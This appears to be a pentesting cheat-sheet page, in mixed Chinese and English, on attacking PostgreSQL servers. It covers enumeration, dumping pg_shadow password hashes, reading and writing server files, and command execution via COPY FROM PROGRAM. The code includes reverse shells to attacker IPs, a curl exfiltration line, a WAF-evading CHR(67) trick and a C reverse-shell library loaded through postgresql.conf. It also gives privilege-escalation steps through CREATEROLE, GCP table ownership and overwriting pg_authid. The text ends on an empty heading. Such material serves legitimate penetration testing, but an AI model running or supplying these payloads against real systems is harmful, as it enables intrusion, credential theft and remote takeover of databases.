# 5432,5433 - Pentesting Postgresql

{{#include ../banners/hacktricks-training.md}}

## **基本信息**

**PostgreSQL** 被描述为一个 **对象-关系数据库系统**，并且是 **开源** 的。该系统不仅使用 SQL 语言，而且对其进行了扩展，增加了额外功能。它能够处理各种数据类型和操作，使其成为开发者和组织的多用途选择。

**默认端口：** 5432，若该端口已被占用，postgresql 会使用下一个未被占用的端口（可能为 5433）。
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## 连接 & Basic Enum
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
> [!WARNING]
> 如果运行 **`\list`** 时你发现一个名为 **`rdsadmin`** 的数据库，你就知道你在一个 **AWS postgresql database** 里。

有关 **如何滥用 PostgreSQL database** 的更多信息，请查看：

{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/
{{#endref}}

## 自动枚举
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**Brute force**](../generic-hacking/brute-force.md#postgresql)

### **Port scanning**

根据 [**this research**](https://www.exploit-db.com/papers/13084)，当连接尝试失败时，`dblink` 会抛出一个 `sqlclient_unable_to_establish_sqlconnection` 异常，其中包含对错误的说明。下面列出了一些此类详细信息的示例。
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
- 主机不可达

`DETAIL: could not connect to server: No route to host Is the server running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?`

- 端口已关闭
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
- 端口开放
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
或
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
- 端口开放或被过滤
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
In PL/pgSQL functions, it is currently not possible to obtain exception details. However, if you have direct access to the PostgreSQL server, you can retrieve the necessary information. If extracting usernames and passwords from the system tables is not feasible, you may consider utilizing the wordlist attack method discussed in the preceding section, as it could potentially yield positive results.

## 权限枚举

### 角色

| 角色类型       |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | 该角色具有超级用户权限                                                                                                                                |
| rolinherit     | 该角色自动继承其所属于角色的权限                                                                                                                      |
| rolcreaterole  | 该角色可以创建其它角色                                                                                                                              |
| rolcreatedb    | 该角色可以创建数据库                                                                                                                                 |
| rolcanlogin    | 该角色可以登录。也就是说，该角色可以作为初始会话授权标识                                                                                               |
| rolreplication | 该角色为复制角色。复制角色可以发起复制连接并创建或删除复制槽。                                                                                         |
| rolconnlimit   | 对于可以登录的角色，此项设置该角色可建立的最大并发连接数。-1 表示不限制。                                                                              |
| rolpassword    | 不是密码（始终显示为 `********`）                                                                                                                     |
| rolvaliduntil  | 密码过期时间（仅用于密码认证）；若无过期则为 null                                                                                                     |
| rolbypassrls   | 该角色绕过所有行级安全策略，详见 [Section 5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html) 获取更多信息。                                 |
| rolconfig      | 该角色的运行时配置变量的特定默认值                                                                                                                     |
| oid            | 角色的 ID                                                                                                                                           |

#### 相关重要组

- 如果你是 **`pg_execute_server_program`** 的成员，你可以 **执行** 程序
- 如果你是 **`pg_read_server_files`** 的成员，你可以 **读取** 文件
- 如果你是 **`pg_write_server_files`** 的成员，你可以 **写入** 文件

> [!TIP]
> 注意，在 Postgres 中 **user**、**group** 和 **role** 是 **相同的**。这取决于你 **如何使用它** 以及是否 **允许其登录**。
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### 表格
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### 函数
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## 文件系统操作

### 读取目录和文件

From this [**commit** ](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) 被定义为 **`DEFAULT_ROLE_READ_SERVER_FILES`** 组（称为 **`pg_read_server_files`**）的成员以及 **super users** 可以在任意路径上使用 **`COPY`** 方法（查看 `convert_and_check_filename` 在 `genfile.c`）：
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
> [!WARNING]
> 请记住，如果你不是超级用户但拥有 **CREATEROLE** 权限，你可以 **使自己成为该组的成员：**
>
> ```sql
> GRANT pg_read_server_files TO username;
> ```
>
> [**More info.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

还有 **其他 postgres 函数** 可用于 **读取文件或列出目录**。只有 **超级用户** 和 **具有显式权限的用户** 才能使用它们：
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
您可以在 [https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html) 找到 **更多函数**

### 简单文件写入

只有 **super users** 和 **`pg_write_server_files`** 的成员可以使用 copy 写入文件。
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
> [!WARNING]
> 记住，如果你不是 super user，但拥有 **`CREATEROLE`** 权限，你可以**将自己添加为该组的成员：**
>
> ```sql
> GRANT pg_write_server_files TO username;
> ```
>
> [**More info.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

记住 COPY 无法处理换行字符，因此即使你使用 base64 有效载荷，**你也需要发送一行命令**。\
一个非常重要的限制是 **`copy` 不能用于写入二进制文件，因为它会修改某些二进制值。**

### **二进制文件上传**

不过，还有**其他技术可以上传较大的二进制文件：**


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md
{{#endref}}



### 通过本地文件写入更新 PostgreSQL 表数据

如果你拥有读取和写入 PostgreSQL 服务器文件的必要权限，你可以通过**覆盖关联的 filenode** 在 [the PostgreSQL data directory](https://www.postgresql.org/docs/8.1/storage.html) 中更新服务器上的任意表。**更多关于此技术的信息** [**here**](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users)。

所需步骤：

1.  获取 PostgreSQL 数据目录

```sql
SELECT setting FROM pg_settings WHERE name = 'data_directory';
```

**注意：** 如果你无法从 settings 中检索当前数据目录路径，可以通过 `SELECT version()` 查询获取 PostgreSQL 的主版本并尝试暴力猜测路径。Unix 上 PostgreSQL 常见的数据目录路径为 `/var/lib/PostgreSQL/MAJOR_VERSION/CLUSTER_NAME/`。常见的 cluster 名称是 `main`。

2.  获取与目标表关联的 filenode 的相对路径

```sql
SELECT pg_relation_filepath('{TABLE_NAME}')
```

该查询应返回类似 `base/3/1337` 的内容。磁盘上的完整路径将是 `$DATA_DIRECTORY/base/3/1337`，即 `/var/lib/postgresql/13/main/base/3/1337`。

3.  通过 `lo_*` 函数下载 filenode

```sql
SELECT lo_import('{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}',13337)
```

4.  获取与目标表关联的数据类型

```sql
SELECT
STRING_AGG(
CONCAT_WS(
',',
attname,
typname,
attlen,
attalign
),
';'
)
FROM pg_attribute
JOIN pg_type
ON pg_attribute.atttypid = pg_type.oid
JOIN pg_class
ON pg_attribute.attrelid = pg_class.oid
WHERE pg_class.relname = '{TABLE_NAME}';
```

5.  使用 [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) [编辑 filenode](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users)；将所有 `rol*` 布尔标志设置为 1 以获得全部权限。

```bash
python3 postgresql_filenode_editor.py -f {FILENODE} --datatype-csv {DATATYPE_CSV_FROM_STEP_4} -m update -p 0 -i ITEM_ID --csv-data {CSV_DATA}
```

![PostgreSQL Filenode Editor Demo](https://raw.githubusercontent.com/adeadfed/postgresql-filenode-editor/main/demo/demo_datatype.gif)

6.  通过 `lo_*` 函数重新上传已编辑的 filenode，并覆盖磁盘上的原始文件

```sql
SELECT lo_from_bytea(13338,decode('{BASE64_ENCODED_EDITED_FILENODE}','base64'))
SELECT lo_export(13338,'{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}')
```

7.  _(可选)_ 通过运行一个耗费资源的 SQL 查询来清除内存中的表缓存

```sql
SELECT lo_from_bytea(133337, (SELECT REPEAT('a', 128*1024*1024))::bytea)
```

8.  现在你应该能在 PostgreSQL 中看到已更新的表值。

你也可以通过编辑 `pg_authid` 表成为 superadmin。**见** [**the following section**](pentesting-postgresql.md#privesc-by-overwriting-internal-postgresql-tables)。

## RCE

### **RCE to program**

Since[ version 9.3](https://www.postgresql.org/docs/9.3/release-9-3.html), only **super users** and member of the group **`pg_execute_server_program`** can use copy for RCE (example with exfiltration:
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
执行示例：
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
> [!WARNING]
> 记住，如果你不是 super user 但拥有 **`CREATEROLE`** 权限，你可以**把自己加入该组：**
>
> ```sql
> GRANT pg_execute_server_program TO username;
> ```
>
> [**More info.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

或者使用来自 **metasploit** 的 `multi/postgres/postgres_copy_from_program_cmd_exec` 模块。\
关于此漏洞的更多信息见 [**here**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5)。尽管被报告为 CVE-2019-9193，Postges 宣称这是一个特性并且不会被修复，详见 [链接](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/)。

#### 绕过关键字过滤器/WAF 以到达 COPY PROGRAM

在带有 stacked queries 的 SQLi 场景中，WAF 可能会移除或阻止字面关键字 `COPY`。你可以动态构造该语句并在 PL/pgSQL DO block 内执行。例如，用 `CHR(67)` 构造开头的 C 以绕过简单的过滤器，然后使用 EXECUTE 执行组装好的命令：
```sql
DO $$
DECLARE cmd text;
BEGIN
cmd := CHR(67) || 'OPY (SELECT '''') TO PROGRAM ''bash -c "bash -i >& /dev/tcp/10.10.14.8/443 0>&1"''';
EXECUTE cmd;
END $$;
```
This pattern avoids static keyword filtering and still achieves OS command execution via `COPY ... PROGRAM`. It is especially useful when the application echoes SQL errors and allows stacked queries.

### RCE with PostgreSQL Languages


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md
{{#endref}}

### RCE with PostgreSQL extensions

Once you have **learned** from the previous post **how to upload binary files** you could try obtain **RCE uploading a postgresql extension and loading it**.


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md
{{#endref}}

### PostgreSQL configuration file RCE

> [!TIP]
> The following RCE vectors are especially useful in constrained SQLi contexts, as all steps can be performed through nested SELECT statements

The **configuration file** of PostgreSQL is **writable** by the **postgres user**, which is the one running the database, so as **superuser**, you can write files in the filesystem, and therefore you can **overwrite this file.**

![](<../images/image (322).png>)

#### **RCE with ssl_passphrase_command**

More information [about this technique here](https://pulsesecurity.co.nz/articles/postgres-sqli).

The configuration file have some interesting attributes that can lead to RCE:

- `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` 数据库私钥的路径
- `ssl_passphrase_command = ''` 如果私钥文件受密码（加密）保护，postgresql 将**执行该属性中指定的命令**。
- `ssl_passphrase_command_supports_reload = off` **如果**该属性为 **on**，当 `pg_reload_conf()` 被**执行**时，如果密钥受密码保护，**将执行**该命令。

Then, an attacker will need to:

1. **Dump private key** from the server
2. **Encrypt** downloaded private key:
1. `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. **Overwrite**
4. **Dump** the current postgresql **configuration**
5. **Overwrite** the **configuration** with the mentioned attributes configuration:
1. `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
2. `ssl_passphrase_command_supports_reload = on`
6. Execute `pg_reload_conf()`

While testing this I noticed that this will only work if the **private key file has privileges 640**, it's **owned by root** and by the **group ssl-cert or postgres** (so the postgres user can read it), and is placed in _/var/lib/postgresql/12/main_.

#### **RCE with archive_command**

**More** [**information about this config and about WAL here**](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)**.**

Another attribute in the configuration file that is exploitable is `archive_command`.

For this to work, the `archive_mode` setting has to be `'on'` or `'always'`. If that is true, then we could overwrite the command in `archive_command` and force it to execute via the WAL (write-ahead logging) operations.

The general steps are:

1. Check whether archive mode is enabled: `SELECT current_setting('archive_mode')`
2. Overwrite `archive_command` with the payload. For eg, a reverse shell: `archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. Reload the config: `SELECT pg_reload_conf()`
4. Force the WAL operation to run, which will call the archive command: `SELECT pg_switch_wal()` or `SELECT pg_switch_xlog()` for some Postgres versions

##### Editing postgresql.conf via Large Objects (SQLi-friendly)

When multi-line writes are needed (e.g., to set multiple GUCs), use PostgreSQL Large Objects to read and overwrite the config entirely from SQL. This approach is ideal in SQLi contexts where `COPY` cannot handle newlines or binary-safe writes.

Example (adjust the major version and path if needed, e.g. version 15 on Debian):
```sql
-- 1) Import the current configuration and note the returned OID (example OID: 114575)
SELECT lo_import('/etc/postgresql/15/main/postgresql.conf');

-- 2) Read it back as text to verify
SELECT encode(lo_get(114575), 'escape');

-- 3) Prepare a minimal config snippet locally that forces execution via WAL
--    and base64-encode its contents, for example:
--    archive_mode = 'always'\n
--    archive_command = 'bash -c "bash -i >& /dev/tcp/10.10.14.8/443 0>&1"'\n
--    archive_timeout = 1\n
--    Then write the new contents into a new Large Object and export it over the original file
SELECT lo_from_bytea(223, decode('<BASE64_POSTGRESQL_CONF>', 'base64'));
SELECT lo_export(223, '/etc/postgresql/15/main/postgresql.conf');

-- 4) Reload the configuration and optionally trigger a WAL switch
SELECT pg_reload_conf();
-- Optional explicit trigger if needed
SELECT pg_switch_wal();  -- or pg_switch_xlog() on older versions
```
在启用 `archive_mode` 的前提下，这会导致以 `postgres` 用户通过 `archive_command` 可靠地执行操作系统命令。实际上，将 `archive_timeout` 设置得较低可以触发快速调用，而无需显式执行 WAL 切换。

#### **RCE with preload libraries**

More information [about this technique here](https://adeadfed.com/posts/postgresql-select-only-rce/).

此攻击向量利用了以下配置变量：

- `session_preload_libraries` -- 在客户端连接时由 PostgreSQL 服务器加载的库。
- `dynamic_library_path` -- PostgreSQL 服务器搜索这些库的目录列表。

我们可以将 `dynamic_library_path` 的值设置为由运行数据库的 `postgres` 用户可写的目录，例如 `/tmp/` 目录，并将恶意的 `.so` 对象上传到该目录。接着，通过将其包含在 `session_preload_libraries` 变量中，强制 PostgreSQL 服务器加载我们新上传的库。

攻击步骤如下：

1. Download the original `postgresql.conf`
2. Include the `/tmp/` directory in the `dynamic_library_path` value, e.g. `dynamic_library_path = '/tmp:$libdir'`
3. Include the malicious library name in the `session_preload_libraries` value, e.g. `session_preload_libraries = 'payload.so'`
4. Check major PostgreSQL version via the `SELECT version()` query
5. Compile the malicious library code with the correct PostgreSQL dev package Sample code:

```c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

void _init() {
/*
code taken from https://www.revshells.com/
*/

int port = REVSHELL_PORT;
struct sockaddr_in revsockaddr;

int sockt = socket(AF_INET, SOCK_STREAM, 0);
revsockaddr.sin_family = AF_INET;
revsockaddr.sin_port = htons(port);
revsockaddr.sin_addr.s_addr = inet_addr("REVSHELL_IP");

connect(sockt, (struct sockaddr *) &revsockaddr,
sizeof(revsockaddr));
dup2(sockt, 0);
dup2(sockt, 1);
dup2(sockt, 2);

char * const argv[] = {"/bin/bash", NULL};
execve("/bin/bash", argv, NULL);
}
```

Compiling the code:

```bash
gcc -I$(pg_config --includedir-server) -shared -fPIC -nostartfiles -o payload.so payload.c
```

6. Upload the malicious `postgresql.conf`, created in steps 2-3, and overwrite the original one  
7. Upload the `payload.so` from step 5 to the `/tmp` directory  
8. Reload the server configuration by restarting the server or invoking the `SELECT pg_reload_conf()` query  
9. At the next DB connection, you will receive the reverse shell connection.

## **Postgres Privesc**

### CREATEROLE Privesc

#### **Grant**

_具有 **`CREATEROLE`** 权限的角色可以对任何非 **superuser** 的角色授予或撤销成员身份。_

因此，如果你拥有 **`CREATEROLE`** 权限，你可以将自己添加到其他非 **superuser** 的 **roles** 中，从而获得读取和写入文件以及执行命令的能力：
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### 修改密码

拥有此角色的用户也可以 **更改** 其他 **非超级用户** 的 **密码**：
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### Privesc to SUPERUSER

通常会发现 **本地用户可以在 PostgreSQL 中无需提供密码即可登录**。因此，一旦你获得了 **执行代码的权限**，就可以滥用这些权限来为自己授予 **`SUPERUSER`** 角色：
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
> [!TIP]
> 这通常是因为 **`pg_hba.conf`** 文件中存在以下几行：
>
> ```bash
> # "local" is for Unix domain socket connections only
> local   all             all                                     trust
> # IPv4 local connections:
> host    all             all             127.0.0.1/32            trust
> # IPv6 local connections:
> host    all             all             ::1/128                 trust
> ```

### **ALTER TABLE privesc**

在 [**this writeup**](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities) 中解释了如何在 Postgres GCP 中滥用授予给用户的 ALTER TABLE 权限以实现 **privesc**。

当你尝试 **将另一个用户设为表的所有者** 时，通常会收到阻止该操作的 **错误**，但显然 GCP 在 GCP 中将该 **选项授予了非 superuser 的 postgres 用户**：

<figure><img src="../images/image (537).png" alt=""><figcaption></figcaption></figure>

将这一点与以下事实结合：当在一个 **带有索引函数的 table** 上执行 **INSERT/UPDATE/**[**ANALYZE**](https://www.postgresql.org/docs/13/sql-analyze.html) 命令时，作为命令一部分的 **function** 会以 **table** 所有者的权限被 **调用**。可以创建一个带有 function 的索引，并将该表的所有者权限赋予一个 **super user**，然后对该表运行带有恶意函数的 ANALYZE，恶意函数将能够执行命令，因为它使用的是所有者的权限。
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### Exploitation

1. 首先创建一个新表。
2. 向表中插入一些无关的数据，以为索引函数提供数据。
3. 编写一个包含代码执行载荷的恶意索引函数，使其能够执行未授权的命令。
4. 使用 ALTER 将表的所有者更改为 "cloudsqladmin"，该角色是 GCP 专门供 Cloud SQL 管理和维护数据库使用的超级用户角色。
5. 对该表执行 ANALYZE 操作。此操作会迫使 PostgreSQL 引擎切换到表所有者 "cloudsqladmin" 的用户上下文。因此，恶意索引函数将以 "cloudsqladmin" 的权限被调用，从而能够执行先前未授权的 shell 命令。

In PostgreSQL, this flow looks something like this:
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
然后，`shell_commands_results` 表将包含已执行代码的输出：
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### 本地登录

一些配置错误的 postgresql 实例可能允许任何本地用户登录，可以使用 **`dblink` 函数** 从 127.0.0.1 进行本地登录：
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
> [!WARNING]
> 注意，为了让前面的查询生效，**函数 `dblink` 必须存在**。如果它不存在，你可以尝试用下面的命令创建它：
>
> ```sql
> CREATE EXTENSION dblink;
> ```
>
如果你拥有一个权限更高的用户的密码，但该用户不被允许从 external IP 登录，你可以使用下面的函数以该用户身份执行查询：
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
可以使用以下方法检查此函数是否存在：
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### **自定义函数** SECURITY DEFINER

[**In this writeup**](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql), pentesters were able to privesc inside a postgres instance provided by IBM, because they **found this function with the SECURITY DEFINER flag**:

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
…
</code></pre>

正如 [**explained in the docs**](https://www.postgresql.org/docs/current/sql-createfunction.html) 所述，带有 **SECURITY DEFINER is executed** 的函数会以该函数的拥有者（**user that owns it**）的权限执行。因此，如果该函数 **vulnerable to SQL Injection** 或者对攻击者可控参数执行一些 **privileged actions with params controlled by the attacker**，则可能被滥用来 **escalate privileges inside postgres**。

在上面代码的第4行可以看到该函数具有 **SECURITY DEFINER** 标志。
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
然后 **执行命令**：

<figure><img src="../images/image (649).png" alt=""><figcaption></figcaption></figure>

### 使用 PL/pgSQL 进行密码暴力破解

**PL/pgSQL** 是一个 **功能完整的编程语言**，相较于 SQL 提供了更强的过程控制。它支持使用 **loops** 和其他 **control structures** 来增强程序逻辑。此外，**SQL statements** 和 **triggers** 能够调用使用 **PL/pgSQL language** 创建的 functions。此集成使得数据库编程和自动化更全面、更灵活。\
**你可以滥用该语言以要求 PostgreSQL 对用户凭证进行 brute-force。**


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md
{{#endref}}

### Privesc by Overwriting Internal PostgreSQL Tables

> [!TIP]
> 下面的 privesc 向量在受限的 SQLi 上下文中特别有用，因为所有步骤都可以通过嵌套的 SELECT statements 完成

如果你可以 **read and write PostgreSQL server files**，你可以通过覆盖与内部 `pg_authid` 表关联的 PostgreSQL on-disk filenode 来 **become a superuser**。

Read more about **this technique** [**here**](https://adeadfed.com/posts/updating-postgresql-data-without-update/)**.**

The attack steps are:

1. 获取 PostgreSQL 数据目录
2. 获取与 `pg_authid` 表关联的 filenode 的相对路径
3. 通过 `lo_*` functions 下载该 filenode
4. 获取与 `pg_authid` 表关联的 datatype
5. 使用 the [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) 来 [edit the filenode](https://adeadfed.com/posts/updating-postgresql-data-without-update/#privesc-updating-pg_authid-table)；将所有 `rol*` boolean flags 设为 1 以获得完整权限。
6. 通过 `lo_*` functions 重新上传已编辑的 filenode，并覆盖磁盘上的原始文件
7. （可选）通过运行一个开销大的 SQL query 清除内存中的表缓存
8. 现在你应该拥有 full superadmin 的权限。

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### 日志记录

在 _**postgresql.conf**_ 文件中，你可以通过更改以下内容来启用 postgresql 日志：
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
然后，**重启服务**。

### pgadmin

[pgadmin](https://www.pgadmin.org) 是一个用于 PostgreSQL 的管理与开发平台。\
你可以在 _**pgadmin4.db**_ 文件中找到 **passwords**\
你可以使用脚本中的 _**decrypt**_ 函数对其进行解密： [https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg_hba

